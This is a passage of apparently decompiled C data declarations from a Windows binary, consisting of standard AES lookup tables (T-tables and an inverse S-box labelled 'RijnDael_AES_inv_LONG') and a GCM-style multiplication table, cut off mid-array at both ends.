  1874508501,
  -260540280,
  1243948399,
  1546530418,
  941366308,
  1470539505,
  1941222599,
  -1748580783,
  -873928669,
  -1579295364,
  -395021156,
  1042226977,
  -1773450275,
  1639824860,
  227249030,
  260737669,
  -529502064,
  2084453954,
  1907733956,
  -865704278,
  -1874310952,
  100860677,
  -134810111,
  470683154,
  -1033805405,
  1781871967,
  -1370007559,
  1773779408,
  394692241,
  -1715355304,
  974986535,
  664706745,
  -639508168,
  -336005101,
  731420851,
  571543859,
  -764843589,
  -1445340816,
  126783113,
  865375399,
  765172662,
  1008606754,
  361203602,
  -907417312,
  -2016489911,
  -1437248001,
  1344809080,
  -1512054918,
  59542671,
  1503764984,
  160008576,
  437062935,
  1707065306,
  -672733647,
  -2076032314,
  -798463816,
  -2109652541,
  697932208,
  1512910199,
  504303377,
  2075177163,
  -1470868228,
  1841019862,
  739644986
}; // weak
int dword_140116510[256] =
{
  -1513725085,
  -2064089988,
  -1712425097,
  -1913226373,
  234877682,
  -1110021269,
  -1310822545,
  1418839493,
  1348481072,
  50462977,
  -1446090905,
  2102799147,
  434634494,
  1656084439,
  -431117397,
  -1695779210,
  1167051466,
  -1658879358,
  1082771913,
  -2013627011,
  368048890,
  -340633255,
  -913422521,
  201060592,
  -331240019,
  1739838676,
  -44064094,
  -364531793,
  -1088185188,
  -145513308,
  -1763413390,
  1536934080,
  -1032472649,
  484572669,
  -1371696237,
  1783375398,
  1517041206,
  1098792767,
  49674231,
  1334037708,
  1550332980,
  -195975771,
  886171109,
  150598129,
  -1813876367,
  1940642008,
  1398944049,
  1059722517,
  201851908,
  1385547719,
  1699095331,
  1587397571,
  674240536,
  -1590192490,
  252314885,
  -1255171430,
  151914247,
  908333586,
  -1692696448,
  1038082786,
  651029483,
  1766729511,
  -847269198,
  -1612024459,
  454166793,
  -1642232957,
  1951935532,
  775166490,
  758520603,
  -1294176658,
  -290170278,
  -77881184,
  -157003182,
  1299594043,
  1639438038,
  -830622797,
  2068982057,
  1054729187,
  1901997871,
  -1760328572,
  -173649069,
  1757008337,
  0,
  750906861,
  1614815264,
  535035132,
  -931548751,
  -306816165,
  -1093375382,
  1183697867,
  -647512386,
  1265776953,
  -560706998,
  -728216500,
  -391096232,
  1250283471,
  1807470800,
  717615087,
  -447763798,
  384695291,
  -981056701,
  -677753523,
  1432761139,
  -1810791035,
  -813021883,
  283769337,
  100925954,
  -2114027649,
  -257929136,
  1148730428,
  -1171939425,
  -481580888,
  -207466159,
  -27417693,
  -1065336768,
  -1979347057,
  -1388342638,
  -1138647651,
  1215313976,
  82966005,
  -547111748,
  -1049119050,
  1974459098,
  1665278241,
  807407632,
  451280895,
  251524083,
  1841287890,
  1283575245,
  337120268,
  891687699,
  801369324,
  -507617441,
  -1573546089,
  -863484860,
  959321879,
  1469301956,
  -229267545,
  -2097381762,
  1199193405,
  -1396153244,
  -407216803,
  724703513,
  -1780059277,
  -1598005152,
  -1743158911,
  -778154161,
  2141445340,
  1715741218,
  2119445034,
  -1422159728,
  -2096396152,
  -896776634,
  700968686,
  -747915080,
  1009259540,
  2041044702,
  -490971554,
  487983883,
  1991105499,
  1004265696,
  1449407026,
  1316239930,
  504629770,
  -611169975,
  168560134,
  1816667172,
  -457679780,
  1570751170,
  1857934291,
  -280777556,
  -1497079198,
  -1472622191,
  -1540254315,
  936633572,
  -1947043463,
  852879335,
  1133234376,
  1500395319,
  -1210421907,
  -1946055283,
  1689376213,
  -761508274,
  -532043351,
  -1260884884,
  -89369002,
  133428468,
  634383082,
  -1345690267,
  -1896580486,
  -381178194,
  403703816,
  -714097990,
  -1997506440,
  1867130149,
  1918643758,
  607656988,
  -245913946,
  -948718412,
  1368901318,
  600565992,
  2090982877,
  -1662487436,
  557719327,
  -577352885,
  -597574211,
  -2045932661,
  -2062579062,
  -1864339344,
  1115438654,
  -999180875,
  -1429445018,
  -661632952,
  84280067,
  33027830,
  303828494,
  -1547542175,
  1600795957,
  -106014889,
  -798377543,
  -1860729210,
  1486471617,
  658119965,
  -1188585826,
  953803233,
  334231800,
  -1288988520,
  857870609,
  -1143838359,
  1890179545,
  -1995993458,
  -1489791852,
  -1238525029,
  574365214,
  -1844082809,
  550103529,
  1233637070,
  -5614251,
  2018519080,
  2057691103,
  -1895592820,
  -128343647,
  -2146858615,
  387583245,
  -630865985,
  836232934,
  -964410814,
  -1194301336,
  -1014873791,
  -1339450983,
  2002398509,
  287182607,
  -881086288,
  -56077228,
  -697451589,
  975967766
}; // weak
int dword_140116910[256] =
{
  1671808611,
  2089089148,
  2006576759,
  2072901243,
  -233963534,
  1807603307,
  1873927791,
  -984313403,
  810573872,
  16974337,
  1739181671,
  729634347,
  -31856642,
  -681396777,
  -1410970197,
  1989864566,
  -901410870,
  -2103631998,
  -918517303,
  2106063485,
  -99225606,
  1508618841,
  1204391495,
  -267650064,
  -1377025619,
  -731401260,
  -1560453214,
  -1343601233,
  -1665195108,
  -1527295068,
  1922491506,
  -1067738176,
  -1211992649,
  -48438787,
  -1817297517,
  644500518,
  911895606,
  1061256767,
  -150800905,
  -867204148,
  878471220,
  -1510714971,
  -449523227,
  -251069967,
  1905517169,
  -663508008,
  827548209,
  356461077,
  67897348,
  -950889017,
  593839651,
  -1017209405,
  405286936,
  -1767819370,
  84871685,
  -1699401830,
  118033927,
  305538066,
  -2137318528,
  -499261470,
  -349778453,
  661212711,
  -1295155278,
  1973414517,
  152769033,
  -2086789757,
  745822252,
  439235610,
  455947803,
  1857215598,
  1525593178,
  -1594139744,
  1391895634,
  994932283,
  -698239018,
  -1278313037,
  695947817,
  -482419229,
  795958831,
  -2070473852,
  1408607827,
  -781665839,
  0,
  -315833875,
  543178784,
  -65018884,
  -1312261711,
  1542305371,
  1790891114,
  -884568629,
  -1093048386,
  961245753,
  1256100938,
  1289001036,
  1491644504,
  -817199665,
  -798245936,
  -282409489,
  -1427812438,
  -82383365,
  1137018435,
  1305975373,
  861234739,
  -2053893755,
  1171229253,
  -116332039,
  33948674,
  2139225727,
  1357946960,
  1011120188,
  -1615190625,
  -1461498968,
  1374921297,
  -1543610973,
  1086357568,
  -1886780017,
  -1834139758,
  -1648615011,
  944271416,
  -184225291,
  -1126210628,
  -1228834890,
  -629821478,
  560153121,
  271589392,
  -15014401,
  -217121293,
  -764559406,
  -850624051,
  202643468,
  322250259,
  -332413972,
  1608629855,
  -1750977129,
  1154254916,
  389623319,
  -1000893500,
  -1477290585,
  2122513534,
  1028094525,
  1689045092,
  1575467613,
  422261273,
  1939203699,
  1621147744,
  -2120738431,
  1339137615,
  -595614756,
  577127458,
  712922154,
  -1867826288,
  -2004677752,
  1187679302,
  -299251730,
  -1194103880,
  339486740,
  -562452514,
  1591917662,
  186455563,
  -612979237,
  -532948000,
  844522546,
  978220090,
  169743370,
  1239126601,
  101321734,
  611076132,
  1558493276,
  -1034051646,
  -747717165,
  -1393605716,
  1655096418,
  -1851246191,
  -1784401515,
  -466103324,
  2039214713,
  -416098841,
  -935097400,
  928607799,
  1840765549,
  -1920204403,
  -714821163,
  1322425422,
  -1444918871,
  1823791212,
  1459268694,
  -200805388,
  -366620694,
  1706019429,
  2056189050,
  -1360443474,
  135794696,
  -1160417350,
  2022240376,
  628050469,
  779246638,
  472135708,
  -1494132826,
  -1261997132,
  -967731258,
  -400307224,
  -579034659,
  1956440180,
  522272287,
  1272813131,
  -1109630531,
  -1954148981,
  -1970991222,
  1888542832,
  1044544574,
  -1245417035,
  1722469478,
  1222152264,
  50660867,
  -167643146,
  236067854,
  1638122081,
  895445557,
  1475980887,
  -1177523783,
  -2037311610,
  -1051158079,
  489110045,
  -1632032866,
  -516367903,
  -132912136,
  -1733088360,
  288563729,
  1773916777,
  -646927911,
  -1903622258,
  -1800981612,
  -1682559589,
  505560094,
  -2020469369,
  -383727127,
  -834041906,
  1442818645,
  678973480,
  -545610273,
  -1936784500,
  -1577559647,
  -1988097655,
  219617805,
  -1076206145,
  -432941082,
  1120306242,
  1756942440,
  1103331905,
  -1716508263,
  762796589,
  252780047,
  -1328841808,
  1425844308,
  -1143575109,
  372911126
}; // weak
int dword_140116D10[256] =
{
  1667474886,
  2088535288,
  2004326894,
  2071694838,
  -219017729,
  1802223062,
  1869591006,
  -976923503,
  808472672,
  16843522,
  1734846926,
  724270422,
  -16901657,
  -673750347,
  -1414797747,
  1987484396,
  -892713585,
  -2105369313,
  -909557623,
  2105378810,
  -84273681,
  1499065266,
  1195886990,
  -252703749,
  -1381110719,
  -724277325,
  -1566376609,
  -1347425723,
  -1667449053,
  -1532692653,
  1920112356,
  -1061135461,
  -1212693899,
  -33743647,
  -1819038147,
  640051788,
  909531756,
  1061110142,
  -134806795,
  -859025533,
  875846760,
  -1515850671,
  -437963567,
  -235861767,
  1903268834,
  -656903253,
  825316194,
  353713962,
  67374088,
  -943238507,
  589522246,
  -1010606435,
  404236336,
  -1768513225,
  84217610,
  -1701137105,
  117901582,
  303183396,
  -2139055333,
  -488489505,
  -336910643,
  656894286,
  -1296904833,
  1970642922,
  151591698,
  -2088526307,
  741110872,
  437923380,
  454765878,
  1852748508,
  1515908788,
  -1600062629,
  1381168804,
  993742198,
  -690593353,
  -1280061827,
  690584402,
  -471646499,
  791638366,
  -2071685357,
  1398011302,
  -774805319,
  0,
  -303223615,
  538992704,
  -50585629,
  -1313748871,
  1532751286,
  1785380564,
  -875870579,
  -1094788761,
  960056178,
  1246420628,
  1280103576,
  1482221744,
  -808498555,
  -791647301,
  -269538619,
  -1431640753,
  -67430675,
  1128514950,
  1296947098,
  859002214,
  -2054843375,
  1162203018,
  -101117719,
  33687044,
  2139062782,
  1347481760,
  1010582648,
  -1616922075,
  -1465326773,
  1364325282,
  -1549533603,
  1077985408,
  -1886418427,
  -1835881153,
  -1650607071,
  943212656,
  -168491791,
  -1128472733,
  -1229536905,
  -623217233,
  555836226,
  269496352,
  -58651,
  -202174723,
  -757961281,
  -842183551,
  202118168,
  320025894,
  -320065597,
  1600119230,
  -1751670219,
  1145359496,
  387397934,
  -993765485,
  -1482165675,
  2122220284,
  1027426170,
  1684319432,
  1566435258,
  421079858,
  1936954854,
  1616945344,
  -2122213351,
  1330631070,
  -589529181,
  572679748,
  707427924,
  -1869567173,
  -2004319477,
  1179044492,
  -286381625,
  -1195846805,
  336870440,
  -555845209,
  1583276732,
  185277718,
  -606374227,
  -522175525,
  842159716,
  976899700,
  168435220,
  1229577106,
  101059084,
  606366792,
  1549591736,
  -1027449441,
  -741118275,
  -1397952701,
  1650632388,
  -1852725191,
  -1785355215,
  -454805549,
  2038008818,
  -404278571,
  -926399605,
  926374254,
  1835907034,
  -1920103423,
  -707435343,
  1313788572,
  -1448484791,
  1819063512,
  1448540844,
  -185333773,
  -353753649,
  1701162954,
  2054852340,
  -1364268729,
  134748176,
  -1162160785,
  2021165296,
  623210314,
  774795868,
  471606328,
  -1499008681,
  -1263220877,
  -960081513,
  -387439669,
  -572687199,
  1953799400,
  522133822,
  1263263126,
  -1111630751,
  -1953790451,
  -1970633457,
  1886425312,
  1044267644,
  -1246378895,
  1718004428,
  1212733584,
  50529542,
  -151649801,
  235803164,
  1633788866,
  892690282,
  1465383342,
  -1179004823,
  -2038001385,
  -1044293479,
  488449850,
  -1633765081,
  -505333543,
  -117959701,
  -1734823125,
  286339874,
  1768537042,
  -640061271,
  -1903261433,
  -1802197197,
  -1684294099,
  505291324,
  -2021158379,
  -370597687,
  -825341561,
  1431699370,
  673740880,
  -539002203,
  -1936945405,
  -1583220647,
  -1987477495,
  218961690,
  -1077945755,
  -421121577,
  1111672452,
  1751693520,
  1094828930,
  -1717981143,
  757954394,
  252645662,
  -1330590853,
  1414855848,
  -1145317779,
  370555436
}; // weak
int dword_140117110[256] =
{
  1374988112,
  2118214995,
  437757123,
  975658646,
  1001089995,
  530400753,
  -1392879445,
  1273168787,
  540080725,
  -1384747530,
  -1999866223,
  -184398811,
  1340463100,
  -987051049,
  641025152,
  -1251826801,
  -558802359,
  632953703,
  1172967064,
  1576976609,
  -1020300030,
  -2125664238,
  -1924753501,
  1809054150,
  59727847,
  361929877,
  -1083344149,
  -1789765158,
  -725712083,
  1484005843,
  1239443753,
  -1899378620,
  1975683434,
  -191989384,
  -1722270101,
  666464733,
  -1092530250,
  -259478249,
  -920605594,
  2110667444,
  1675577880,
  -451268222,
  -1756286112,
  1649639237,
  -1318815776,
  -1150570876,
  -25059300,
  -116905068,
  1883793496,
  -1891238631,
  -1797362553,
  1383856311,
  -1418472669,
  1917518562,
  -484470953,
  1716890410,
  -1293211641,
  800440835,
  -2033878118,
  -751368027,
  807962610,
  599762354,
  33778362,
  -317291940,
  -1966138325,
  -1485196142,
  -217582864,
  1315562145,
  1708848333,
  101039829,
  -785096161,
  -995688822,
  875451293,
  -1561111136,
  92987698,
  -1527321739,
  193195065,
  1080094634,
  1584504582,
  -1116860335,
  1042385657,
  -1763899843,
  -583137874,
  1306967366,
  -1856729675,
  1908694277,
  67556463,
  1615861247,
  429456164,
  -692196969,
  -1992277044,
  1742315127,
  -1326955843,
  126454664,
  -417768648,
  2043211483,
  -1585706425,
  2084704233,
  -125559095,
  0,
  159417987,
  841739592,
  504459436,
  1817866830,
  -49348613,
  260388950,
  1034867998,
  908933415,
  168810852,
  1750902305,
  -1688513327,
  607530554,
  202008497,
  -1822955761,
  -1259432238,
  463180190,
  -2134850225,
  1641816226,
  1517767529,
  470948374,
  -493635062,
  -1063245083,
  1008918595,
  303765277,
  235474187,
  -225720403,
  766945465,
  337553864,
  1475418501,
  -1351284916,
  -291906117,
  -1551933187,
  -150919521,
  1551037884,
  1147550661,
  1543208500,
  -1958532746,
  -886847780,
  -1225917336,
  -1192955549,
  -684598070,
  1113818384,
  328671808,
  -2067394272,
  -2058738563,
  -759480840,
  -1359400431,
  -953573011,
  496906059,
  -592301837,
  226906860,
  2009195472,
  733156972,
  -1452230247,
  294930682,
  1206477858,
  -1459843900,
  -1594867942,
  1451044056,
  573804783,
  -2025238841,
  -650587711,
  -1932877058,
  -1730933962,
  -1493859889,
  -1518674392,
  -625504730,
  1068351396,
  742039012,
  1350078989,
  1784663195,
  1417561698,
  -158526526,
  -1864845080,
  775550814,
  -2101104651,
  -1621262146,
  1775276924,
  1876241833,
  -819653965,
  -928212677,
  270040487,
  -392404114,
  -616842373,
  -853116919,
  1851332852,
  -325404927,
  -2091935064,
  -426414491,
  -1426069890,
  566021896,
  -283776794,
  -1159226407,
  1248802510,
  -358676012,
  699432150,
  832877231,
  708780849,
  -962227152,
  899835584,
  1951317047,
  -58537306,
  -527380304,
  866637845,
  -251357110,
  1106041591,
  2144161806,
  395441711,
  1984812685,
  1139781709,
  -861254316,
  -459930401,
  -1630423581,
  1282050075,
  -1054072904,
  1181045119,
  -1654724092,
  25965917,
  -91786125,
  -83148498,
  -1285087910,
  -1831087534,
  -384805325,
  1842759443,
  -1697160820,
  933301370,
  1509430414,
  -351060855,
  -827774994,
  -1218328267,
  -518199827,
  2051518780,
  -1663901863,
  1441952575,
  404016761,
  1942435775,
  1408749034,
  1610459739,
  -549621996,
  2017778566,
  -894438527,
  -1184316354,
  941896748,
  -1029488545,
  371049330,
  -1126030068,
  675039627,
  -15887039,
  967311729,
  135050206,
  -659233636,
  1683407248,
  2076935265,
  -718096784,
  1215061108,
  -793225406
}; // weak
int dword_140117510[256] =
{
  1347548327,
  1400783205,
  -1021700188,
  -1774573730,
  -885281941,
  -249586363,
  -1414727080,
  -1823743229,
  1428173050,
  -156404115,
  -1853305738,
  636813900,
  -61872681,
  -674944309,
  -2144979644,
  -1883938141,
  1239331162,
  1730525723,
  -1740248562,
  -513933632,
  46346101,
  310463728,
  -1551022441,
  -966011911,
  -419197089,
  -1793748324,
  -339776134,
  -627748263,
  768917123,
  -749177823,
  692707433,
  1150208456,
  1786102409,
  2029293177,
  1805211710,
  -584599183,
  -1229004465,
  401639597,
  1724457132,
  -1266823622,
  409198410,
  -2098914767,
  1620529459,
  1164071807,
  -525245321,
  -2068091986,
  486441376,
  -1795618773,
  1483753576,
  428819965,
  -2020286868,
  -1219331080,
  598438867,
  -495826174,
  1474502543,
  711349675,
  129166120,
  53458370,
  -1702443653,
  -1512884472,
  -231724921,
  -1306280027,
  -1174273174,
  1559041666,
  730517276,
  -1834518092,
  -252508174,
  -1588696606,
  -848962828,
  -721025602,
  533804130,
  -1966823682,
  -1657524653,
  -1599933611,
  839224033,
  1973745387,
  957055980,
  -1438621457,
  106852767,
  1371368976,
  -113368694,
  1033297158,
  -1361232379,
  1179510461,
  -1248766835,
  91341917,
  1862534868,
  -10465259,
  605657339,
  -1747534359,
  -863420349,
  2003294622,
  -1112479678,
  -2012771957,
  954669403,
  -612775698,
  1201765386,
  -377732593,
  -906460130,
  0,
  -2096529274,
  1211247597,
  -1407315600,
  1315723890,
  -67301633,
  1443857720,
  507358933,
  657861945,
  1678381017,
  560487590,
  -778347692,
  975451694,
  -1324610969,
  261314535,
  -759894378,
  -1642357871,
  1333838021,
  -1570644960,
  1767536459,
  370938394,
  182621114,
  -440360918,
  1128014560,
  487725847,
  185469197,
  -1376613433,
  -1188186456,
  -938205527,
  -2057834215,
  1286567175,
  -1141990947,
  -39616672,
  -1611202266,
  -1134791947,
  -985373125,
  878443390,
  1988838185,
  -590666810,
  1756818940,
  1673061617,
  -891866660,
  272786309,
  1075025698,
  545572369,
  2105887268,
  -120407235,
  296679730,
  1841768865,
  1260232239,
  -203640272,
  -334657966,
  -797457949,
  1814803222,
  -1716948807,
  -99511224,
  575138148,
  -995558260,
  446754879,
  -665420500,
  -282971248,
  -947435186,
  -1042728751,
  -24327518,
  915985419,
  -811141759,
  681933534,
  651868046,
  -1539330625,
  -466863459,
  223377554,
  -1687527476,
  1649704518,
  -1024029421,
  -393160520,
  1580087799,
  -175979601,
  -1096852096,
  2087309459,
  -1452288723,
  -1278270190,
  1003007129,
  -1492117379,
  1860738147,
  2077965243,
  164439672,
  -194094824,
  32283319,
  -1467789414,
  1709610350,
  2125135846,
  136428751,
  -420538904,
  -642062437,
  -833982666,
  -722821367,
  -701910916,
  -1355701070,
  824852259,
  818324884,
  -1070226842,
  930369212,
  -1493400886,
  -1327460144,
  355706840,
  1257309336,
  -146674470,
  243256656,
  790073846,
  -1921626666,
  1296297904,
  1422699085,
  -538667516,
  -476130891,
  457992840,
  -1195299809,
  2135319889,
  77422314,
  1560382517,
  1945798516,
  788204353,
  1521706781,
  1385356242,
  870912086,
  325965383,
  -1936009375,
  2050466060,
  -1906706412,
  -1981082820,
  -288446169,
  901210569,
  -304014107,
  1014646705,
  1503449823,
  1062597235,
  2031621326,
  -1082931401,
  -363595827,
  1533017514,
  350174575,
  -2038938405,
  -2117423117,
  1052338372,
  741876788,
  1606591296,
  1914052035,
  213705253,
  -1960297399,
  1107234197,
  1899603969,
  -569897805,
  -1663519516,
  -1872472383,
  1635502980,
  1893020342,
  1950903388,
  1120974935
}; // weak
int dword_140117910[256] =
{
  -1487908364,
  1699970625,
  -1530717673,
  1586903591,
  1808481195,
  1173430173,
  1487645946,
  59984867,
  -95084496,
  1844882806,
  1989249228,
  1277555970,
  -671330331,
  -875051734,
  1149249077,
  -1550863006,
  1514790577,
  459744698,
  244860394,
  -1058972162,
  1963115311,
  -267222708,
  -1750889146,
  -104436781,
  1608975247,
  -1667951214,
  2062270317,
  1507497298,
  -2094148418,
  567498868,
  1764313568,
  -935031095,
  -1989511742,
  2037970062,
  1047239000,
  1910319033,
  1337376481,
  -1390940024,
  -1402549984,
  984907214,
  1243112415,
  830661914,
  861968209,
  2135253587,
  2011214180,
  -1367032981,
  -1608712575,
  731183368,
  1750626376,
  -48656571,
  1820824798,
  -122203525,
  -752637069,
  48394827,
  -1890065633,
  -1423284651,
  671593195,
  -1039978571,
  2073724613,
  145085239,
  -2014171096,
  -1515052097,
  1790575107,
  -2107839210,
  472615631,
  -1265457287,
  -219090169,
  -492745111,
  -187865638,
  -1093335547,
  1646252340,
  -24460122,
  1402811438,
  1436590835,
  -516815478,
  -344611594,
  -331805821,
  -274055072,
  -1626972559,
  273792366,
  -1963377119,
  104699613,
  95345982,
  -1119466010,
  -1917480620,
  1560637892,
  -730921978,
  369057872,
  -81520232,
  -375925059,
  1137477952,
  -1636341799,
  1119727848,
  -1954019447,
  1530455833,
  -287606328,
  172466556,
  266959938,
  516552836,
  0,
  -2038232704,
  -314035669,
  1890328081,
  1917742170,
  -262898,
  945164165,
  -719438418,
  958871085,
  -647755249,
  -1507760036,
  1423022939,
  775562294,
  1739656202,
  -418409641,
  -1764576018,
  -1851909221,
  -984645440,
  547512796,
  1265195639,
  437656594,
  -1173691757,
  719700128,
  -532464606,
  387781147,
  218828297,
  -944901493,
  -1464259146,
  -1446505442,
  428169201,
  122466165,
  -574886247,
  1627235199,
  648017665,
  -172204942,
  1002783846,
  2117360635,
  695634755,
  -958608605,
  -60246291,
  -245122844,
  -590686415,
  -2062531997,
  574624663,
  287343814,
  612205898,
  1039717051,
  840019705,
  -1586641111,
  793451934,
  821288114,
  1391201670,
  -472877119,
  376187827,
  -1181111952,
  1224348052,
  1679968233,
  -1933268740,
  1058709744,
  752375421,
  -1863376333,
  1321699145,
  -775825096,
  -1560376118,
  188127444,
  -2117097739,
  -567761542,
  -1910056265,
  -1079754835,
  -1645990854,
  -1844621192,
  -862229921,
  1180849278,
  331544205,
  -1192718120,
  -144822727,
  -1342864701,
  -2134991011,
  -1820562992,
  766078933,
  313773861,
  -1724135252,
  2108100632,
  1668212892,
  -1149510853,
  2013908262,
  418672217,
  -1224610662,
  -1700232369,
  1852171925,
  -427906305,
  -821550660,
  -387518699,
  -1680229657,
  919489135,
  164948639,
  2094410160,
  -1297141340,
  590424639,
  -1808742747,
  1723872674,
  -1137216434,
  -895026046,
  -793714544,
  -669699161,
  -1739919100,
  -621329940,
  1343127501,
  -164685935,
  -695372211,
  -1337113617,
  1297403050,
  81781910,
  -1243373871,
  -2011476886,
  532201772,
  1367295589,
  -368796322,
  895287692,
  1953757831,
  1093597963,
  492483431,
  -766340389,
  1446242576,
  1192455638,
  1636604631,
  209336225,
  344873464,
  1015671571,
  669961897,
  -919226527,
  -437395172,
  -1321436601,
  -547775278,
  1933530610,
  -830924780,
  935293895,
  -840281097,
  -1436852227,
  1863638845,
  -611944380,
  -209597777,
  -1002522264,
  875313188,
  1080017571,
  -1015933411,
  621591778,
  1233856572,
  -1790836979,
  24197544,
  -1277294580,
  -459482956,
  -1047501738,
  -2073986101,
  -1234119374,
  1551124588,
  1463996600
}; // weak
int dword_140117D10[256] =
{
  -190361519,
  1097159550,
  396673818,
  660510266,
  -1418998981,
  -1656360673,
  -94852180,
  -486304949,
  821712160,
  1986918061,
  -864644728,
  38544885,
  -438830001,
  718002117,
  893681702,
  1654886325,
  -1319482914,
  -1172609243,
  -368142267,
  -20913827,
  796197571,
  1290801793,
  1184342925,
  -738605461,
  -1889540349,
  -1835231979,
  1836772287,
  1381620373,
  -1098699308,
  1948373848,
  -529979063,
  -909622130,
  -1031181707,
  -1904641804,
  1480485785,
  -1183720153,
  -514869570,
  -2001922064,
  548169417,
  -835013507,
  -548792221,
  439452389,
  1362321559,
  1400849762,
  1685577905,
  1806599355,
  -2120213250,
  137073913,
  1214797936,
  1174215055,
  -563312748,
  2079897426,
  1943217067,
  1258480242,
  529487843,
  1437280870,
  -349698126,
  -1245576401,
  -981755258,
  923313619,
  679998000,
  -1079659997,
  57326082,
  377642221,
  -820237430,
  2041877159,
  133361907,
  1776460110,
  -621490843,
  96392454,
  878845905,
  -1493267772,
  777231668,
  -212492126,
  -1964953083,
  -152341084,
  -2081670901,
  1626319424,
  1906247262,
  1846563261,
  562755902,
  -586793578,
  1040559837,
  -423803315,
  1418573201,
  -1000536719,
  114585348,
  1343618912,
  -1728371687,
  -1108764714,
  1078185097,
  -643926169,
  -398279248,
  -1987344377,
  425408743,
  -923870343,
  2081048481,
  1108339068,
  -2078357000,
  0,
  -2138668279,
  736970802,
  292596766,
  1517440620,
  251657213,
  -2059905521,
  -1361764803,
  758720310,
  265905162,
  1554391400,
  1532285339,
  908999204,
  174567692,
  1474760595,
  -292105548,
  -1684955621,
  -1060810880,
  -601841055,
  2001430874,
  303699484,
  -1816524062,
  -1607801408,
  585122620,
  454499602,
  151849742,
  -1949848078,
  -1230456531,
  514443284,
  -249985705,
  1963412655,
  -1713521682,
  2137062819,
  19308535,
  1928707164,
  1715193156,
  -75615141,
  1126790795,
  600235211,
  -302225226,
  -453942344,
  836553431,
  1669664834,
  -1759363053,
  -971956092,
  1243905413,
  -1153566510,
  -114159186,
  698445255,
  -1641067747,
  -1305414692,
  -2041385971,
  -1042034569,
  -1290376149,
  1891211689,
  -1807156719,
  -379313593,
  -57883480,
  -264299872,
  2100090966,
  865136418,
  1229899655,
  953270745,
  -895287668,
  -737462632,
  -176042074,
  2061379749,
  -1215420710,
  -1379949505,
  983426092,
  2022837584,
  1607244650,
  2118541908,
  -1928084746,
  -658970480,
  972512814,
  -1011878526,
  1568718495,
  -795640727,
  -718427793,
  621982671,
  -1399243832,
  410887952,
  -1671205144,
  1002142683,
  645401037,
  1494807662,
  -1699282452,
  1335535747,
  -1787927066,
  -1671510,
  -1127282655,
  367585007,
  -409216582,
  1865862730,
  -1626745622,
  -1333995991,
  -1531793615,
  1059270954,
  -1517014842,
  -1570324427,
  1320957812,
  -2100648196,
  -1865371424,
  -1479011021,
  77089521,
  -321194175,
  -850391425,
  -1846137065,
  1305906550,
  -273658557,
  -1437772596,
  -1778065436,
  -776608866,
  1787304780,
  740276417,
  1699839814,
  1592394909,
  -1942659839,
  -2022411270,
  188821243,
  1729977011,
  -606973294,
  274084841,
  -699985043,
  -681472870,
  -1593017801,
  -132870567,
  322734571,
  -1457000754,
  1640576439,
  484830689,
  1202797690,
  -757114468,
  -227328171,
  349075736,
  -952647821,
  -137500077,
  -39167137,
  1030690015,
  1155237496,
  -1342996022,
  1757691577,
  607398968,
  -1556062270,
  499347990,
  -500888388,
  1011452712,
  227885567,
  -1476300487,
  213114376,
  -1260086056,
  1455525988,
  -880516741,
  850817237,
  1817998408,
  -1202240816
}; // weak
unsigned __int8 RijnDael_AES_inv_LONG_140118110[260] =
{
  82u,
  9u,
  106u,
  213u,
  48u,
  54u,
  165u,
  56u,
  191u,
  64u,
  163u,
  158u,
  129u,
  243u,
  215u,
  251u,
  124u,
  227u,
  57u,
  130u,
  155u,
  47u,
  255u,
  135u,
  52u,
  142u,
  67u,
  68u,
  196u,
  222u,
  233u,
  203u,
  84u,
  123u,
  148u,
  50u,
  166u,
  194u,
  35u,
  61u,
  238u,
  76u,
  149u,
  11u,
  66u,
  250u,
  195u,
  78u,
  8u,
  46u,
  161u,
  102u,
  40u,
  217u,
  36u,
  178u,
  118u,
  91u,
  162u,
  73u,
  109u,
  139u,
  209u,
  37u,
  114u,
  248u,
  246u,
  100u,
  134u,
  104u,
  152u,
  22u,
  212u,
  164u,
  92u,
  204u,
  93u,
  101u,
  182u,
  146u,
  108u,
  112u,
  72u,
  80u,
  253u,
  237u,
  185u,
  218u,
  94u,
  21u,
  70u,
  87u,
  167u,
  141u,
  157u,
  132u,
  144u,
  216u,
  171u,
  0u,
  140u,
  188u,
  211u,
  10u,
  247u,
  228u,
  88u,
  5u,
  184u,
  179u,
  69u,
  6u,
  208u,
  44u,
  30u,
  143u,
  202u,
  63u,
  15u,
  2u,
  193u,
  175u,
  189u,
  3u,
  1u,
  19u,
  138u,
  107u,
  58u,
  145u,
  17u,
  65u,
  79u,
  103u,
  220u,
  234u,
  151u,
  242u,
  207u,
  206u,
  240u,
  180u,
  230u,
  115u,
  150u,
  172u,
  116u,
  34u,
  231u,
  173u,
  53u,
  133u,
  226u,
  249u,
  55u,
  232u,
  28u,
  117u,
  223u,
  110u,
  71u,
  241u,
  26u,
  113u,
  29u,
  41u,
  197u,
  137u,
  111u,
  183u,
  98u,
  14u,
  170u,
  24u,
  190u,
  27u,
  252u,
  86u,
  62u,
  75u,
  198u,
  210u,
  121u,
  32u,
  154u,
  219u,
  192u,
  254u,
  120u,
  205u,
  90u,
  244u,
  31u,
  221u,
  168u,
  51u,
  136u,
  7u,
  199u,
  49u,
  177u,
  18u,
  16u,
  89u,
  39u,
  128u,
  236u,
  95u,
  96u,
  81u,
  127u,
  169u,
  25u,
  181u,
  74u,
  13u,
  45u,
  229u,
  122u,
  159u,
  147u,
  201u,
  156u,
  239u,
  160u,
  224u,
  59u,
  77u,
  174u,
  42u,
  245u,
  176u,
  200u,
  235u,
  187u,
  60u,
  131u,
  83u,
  153u,
  97u,
  23u,
  43u,
  4u,
  126u,
  186u,
  119u,
  214u,
  38u,
  225u,
  105u,
  20u,
  99u,
  85u,
  33u,
  12u,
  125u,
  0u,
  0u,
  0u,
  1u
}; // weak
_UNKNOWN unk_140118214; // weak
_UNKNOWN unk_14011822C; // weak
_UNKNOWN unk_140118230; // weak
_UNKNOWN unk_140118238; // weak
_QWORD qword_140118240[16] =
{
  0i64,
  2026619832316723200i64,
  4053239664633446400i64,
  2621094983129628672i64,
  8106479329266892800i64,
  7827256152369922048i64,
  5242189966259257344i64,
  6115888293969133568i64,
  -2233785415175766016i64,
  -207165582859042816i64,
  -2792231768969707520i64,
  -4224376450473525248i64,
  -7962364141191036928i64,
  -8241587318088007680i64,
  -6214967485771284480i64,
  -5341269158061408256i64
}; // weak
_UNKNOWN unk_1401182C0; // weak
int dword_1401182C8 = -1504093786; // weak
_DWORD dword_140118300[1024] =
{
  696885672,
  92635524,
  382128852,
  331600848,
  340021332,
  487395612,
  747413676,
  621093156,
  491606364,
  54739776,
  403181592,
  504238620,
  289493328,
  1020063996,
  181060296,
  591618912,
  671621160,
  71581764,
  536879136,
  495817116,
  549511392,
  583197408,
